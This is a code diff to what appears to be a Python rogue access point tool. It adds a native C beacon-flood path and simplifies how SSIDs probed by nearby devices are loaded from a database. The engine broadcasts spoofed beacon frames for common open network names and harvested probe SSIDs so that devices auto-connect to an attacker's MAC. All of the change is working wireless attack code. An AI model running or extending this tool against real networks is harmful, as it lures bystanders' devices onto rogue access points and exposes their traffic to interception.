@@ -19,6 +19,12 @@ from .config import (
     WIFI_BROADCAST, log,
 )
 
+try:
+    from .native.beacon_flood import beacon_flood as native_beacon_flood
+    _HAS_NATIVE = True
+except ImportError:
+    _HAS_NATIVE = False
+
 # Common open SSIDs that trigger auto-connect on many devices
 KNOWN_SSIDS = [
     "attwifi", "xfinitywifi", "Google Starbucks", "Starbucks WiFi",
@@ -62,15 +68,10 @@ class KnownBeaconsEngine:
         These are high-value targets - devices actively looking for them.
         """
         try:
-            db.cursor.execute(
-                'SELECT DISTINCT probed_ssids FROM clients WHERE probed_ssids IS NOT NULL AND probed_ssids != ""')
-            for row in db.cursor.fetchall():
-                if not row[0]:
-                    continue
-                for ssid in row[0].split(','):
-                    ssid = ssid.strip()
-                    if ssid and ssid not in self._ssid_list:
-                        self._ssid_list.append(ssid)
+            probed = db.get_probed_ssids()
+            for ssid in probed:
+                if ssid not in self._ssid_list:
+                    self._ssid_list.append(ssid)
             log.info(f"Beacons: {len(self._ssid_list)} total SSIDs (including probed)")
         except Exception as e:
             log.warning(f"Could not load probed SSIDs from database: {e}")
@@ -100,11 +101,24 @@ class KnownBeaconsEngine:
             batch = self._frames[self._offset:self._offset + KNOWN_BEACON_BATCH]
             if len(batch) < KNOWN_BEACON_BATCH:
                 batch += self._frames[:KNOWN_BEACON_BATCH - len(batch)]
-            for frame in batch:
-                if not self.running:
-                    break
-                sendp(frame, iface=self.interface, verbose=False)
-                time.sleep(BEACON_INTERVAL)
+            if _HAS_NATIVE:
+                # Use native C beacon flood for better performance
+                ssids = [bytes(f[Dot11Elt].info).decode(errors='ignore') for f in batch if f.haslayer(Dot11Elt)]
+                try:
+                    native_beacon_flood(self.interface, self.rogue_mac, ssids)
+                except Exception as e:
+                    log.warning(f"Native beacon flood failed, falling back to sendp: {e}")
+                    for frame in batch:
+                        if not self.running:
+                            break
+                        sendp(frame, iface=self.interface, verbose=False)
+                        time.sleep(BEACON_INTERVAL)
+            else:
+                for frame in batch:
+                    if not self.running:
+                        break
+                    sendp(frame, iface=self.interface, verbose=False)
+                    time.sleep(BEACON_INTERVAL)
 
     def start(self):
         if self.running:
